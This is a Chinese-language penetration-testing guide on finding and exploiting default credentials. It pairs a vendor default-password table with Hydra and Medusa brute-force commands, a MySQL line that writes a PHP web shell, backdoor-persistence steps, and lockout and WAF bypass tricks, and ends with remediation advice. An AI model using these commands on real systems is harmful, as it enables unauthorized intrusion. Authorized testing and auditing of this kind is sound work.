# 默认凭证检测方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对系统、应用、设备默认凭证的系统性检测方法论。默认凭证是导致未授权访问的最常见原因之一。

### 1.2 适用范围
- Web 应用管理后台
- 网络设备（路由器、交换机、防火墙）
- 数据库系统
- 中间件服务
- IoT 设备
- 云服务控制台

### 1.3 读者对象
- 渗透测试工程师
- 安全审计人员
- 红队成员

---

## 第二部分：核心检测技术专题

### 专题：默认凭证检测

#### 2.1 技术介绍

默认凭证（Default Credentials）是指系统、应用或设备出厂时预设的用户名和密码组合。由于用户未修改或运维疏忽，这些凭证成为攻击者入侵的主要途径。

**常见默认凭证来源：**
- 设备厂商预设
- 应用安装默认
- 文档/手册公开
- 社区共享泄露

#### 2.2 常见默认凭证列表

| 系统/应用 | 用户名 | 密码 | 来源 |
|---------|-------|------|------|
| 通用 admin | admin | admin | 常见 |
| 通用 admin | admin | password | 常见 |
| 通用 admin | admin | 123456 | 常见 |
| 通用 root | root | root | Linux/Unix |
| 通用 root | root | toor | Linux/Unix |
| MySQL | root | (空) | 数据库 |
| PostgreSQL | postgres | postgres | 数据库 |
| MongoDB | (无认证) | (无认证) | 数据库 |
| Tomcat Manager | admin | admin | 中间件 |
| Tomcat Manager | tomcat | tomcat | 中间件 |
| Jenkins | admin | admin | CI/CD |
| WebLogic | weblogic | weblogic | 中间件 |
| JBoss | admin | admin | 中间件 |
| Nexus | admin | admin123 | 仓库 |
| GitLab | root | 5iveL!fe | 代码平台 |
| Elasticsearch | elastic | changeme | 数据库 |
| Grafana | admin | admin | 监控 |
| RabbitMQ | guest | guest | 消息队列 |
| Redis | (无认证) | (无认证) | 缓存 |
| SNMP | public | public | 网络协议 |
| SNMP | private | private | 网络协议 |

#### 2.3 检测方法

##### 2.3.1 信息收集

```bash
# 1. 识别应用类型
whatweb target.com
whatweb target.com:8080

# 2. 识别服务版本
nmap -sV -p 80,443,8080,8443 target.com

# 3. 查找管理界面
dirsearch -u target.com -w admin-words.txt
gobuster dir -u target.com -w common-panels.txt
```

##### 2.3.2 自动化检测

```bash
# 1. 使用 Nmap 脚本
nmap --script http-default-accounts -p 80 target.com
nmap --script mysql-empty-password -p 3306 target.com

# 2. 使用 Hydra 暴力破解
hydra -L users.txt -P passwords.txt http://target.com/post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"

# 3. 使用 Medusa
medusa -h target.com -u users.txt -p passwords.txt \
  -M http -m FORM:/login,FORM_LOGIN:user,FORM_PASS:pass,FAIL:Invalid

# 4. 使用 Nuclei
nuclei -t default-logins -u target.com
nuclei -t exposures/tokens -u target.com
```

##### 2.3.3 手动测试

```bash
# 1. 测试常见组合
curl -u admin:admin http://target.com/admin
curl -u root:root http://target.com/
curl -u test:test http://target.com/api

# 2. 测试空密码
curl -u admin: http://target.com/admin

# 3. 测试用户名枚举
curl -d "username=admin&password=wrong" http://target.com/login
# 响应：用户不存在

curl -d "username=existing&password=wrong" http://target.com/login
# 响应：密码错误
```

#### 2.4 利用方法

##### 2.4.1 管理后台访问

```
1. 使用默认凭证登录管理界面
2. 获取系统管理权限
3. 创建持久化后门账户
4. 修改系统配置
5. 部署恶意代码
```

##### 2.4.2 数据库访问

```bash
# MySQL 无密码登录
mysql -u root -h target.com

# 获取权限后：
# 1. 读取敏感数据
SELECT * FROM users;
SELECT * FROM admin;

# 2. 执行系统命令（如有 FILE 权限）
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';
```

##### 2.4.3 服务控制

```
1. Tomcat Manager - 部署恶意 WAR
2. Jenkins - 执行系统命令
3. WebLogic - 部署应用
4. Nexus - 上传恶意包
```

#### 2.5 绕过技术

##### 2.5.1 账户锁定绕过

| 绕过技术 | 描述 |
|---------|------|
| **IP 轮换** | 每次尝试更换源 IP |
| **用户名变异** | admin → administrator → admin1 |
| **延迟尝试** | 每次尝试间隔时间 |
| **分布式破解** | 多源同时尝试 |

##### 2.5.2 WAF 绕过

```bash
# URL 编码凭证
curl -u "admin%00:admin" http://target.com

# 添加额外参数
curl -d "username=admin&password=admin&login=1" http://target.com

# 使用 HTTP 头绕过
curl -H "X-Forwarded-User: admin" http://target.com
```

---

## 第三部分：附录

### 3.1 检测工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **Hydra** | 暴力破解 | `hydra -L users.txt -P pass.txt target http-post-form` |
| **Medusa** | 并行破解 | `medusa -h target -u users.txt -p pass.txt -M http` |
| **Nmap** | 默认凭证扫描 | `nmap --script http-default-accounts target` |
| **Nuclei** | 漏洞扫描 | `nuclei -t default-logins -u target` |
| **Burp Suite** | 手动测试 | Intruder 模块 |

### 3.2 修复建议

1. **首次登录强制修改** - 系统首次使用时强制修改默认密码
2. **实施强密码策略** - 要求复杂密码、定期更换
3. **启用多因素认证** - MFA 防止凭证泄露
4. **限制登录尝试** - 实施账户锁定机制
5. **定期审计** - 检查是否存在默认凭证
6. **删除默认账户** - 移除不必要的默认账户

---

**参考资源：**
- [SecLists Default Passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Passwords)
- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
